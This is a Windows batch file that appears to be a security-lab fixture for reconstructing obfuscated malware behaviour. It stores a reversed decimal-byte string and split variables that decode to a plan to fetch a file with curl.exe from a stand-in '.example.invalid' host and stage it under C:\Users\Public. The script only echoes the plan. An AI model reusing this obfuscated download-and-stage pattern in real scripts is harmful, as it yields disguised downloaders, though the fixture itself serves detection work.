@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:decimal_bytes|reverse
rem HUNTRESS-MATERIAL:116.97.100.46.57.98.52.52.102.56.97.53.98.54.45.101.103.97.116.115.92.98.97.76.115.115.101.114.116.110.117.72.92.99.105.108.98.117.80.92.115.114.101.115.85.92.58.67.61.104.116.97.112.95.101.108.105.102.124.116.97.100.46.51.54.100.101.99.102.53.57.47.100.105.108.97.118.110.105.46.101.108.112.109.97.120.101.46.57.98.52.52.102.56.97.53.98.54.47.47.58.115.112.116.116.104.61.108.114.117.124.57.98.52.52.102.56.97.53.98.54.45.110.103.105.97.112.109.97.99.61.100.105.95.110.103.105.97.112.109.97.99.124.101.110.111.110.61.101.103.97.117.103.110.97.108.95.116.120.101.110.124.100.110.111.109.97.105.100.61.104.112.97.114.103.124.49.61.116.110.117.111.99.95.101.103.97.116.115.124.101.120.101.46.108.114.117.99.61.114.101.116.112.97.100.97.124.101.108.105.102.95.101.116.105.114.119.44.101.116.111.109.101.114.95.101.114.105.117.113.99.97.61.115.112.101.116.115.124.49.61.118
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "item0=v=1|steps=acquire_remote,write_file|adapter=curl.exe|stage_co"
set "item1=unt=1|graph=diamond|next_language=none|campaign_id=campaign-6"
set "item2=b5a8f44b9|url=https://6b5a8f44b9.example.invalid/95fced63.dat"
set "item3=|file_path=C:\Users\Public\HuntressLab\stage-6b5a8f44b9.dat"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_dead_label=40e1d4c0"
for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "item9=%item0%%item1%%item2%%item3%"
exit /b 0
:HUNTRESS_EMIT
echo(!item9!
exit /b 0
:HUNTRESS_PLAN
echo curl.exe acquire https://6b5a8f44b9.example.invalid/95fced63.dat to C:\Users\Public\HuntressLab\stage-6b5a8f44b9.dat
exit /b 0
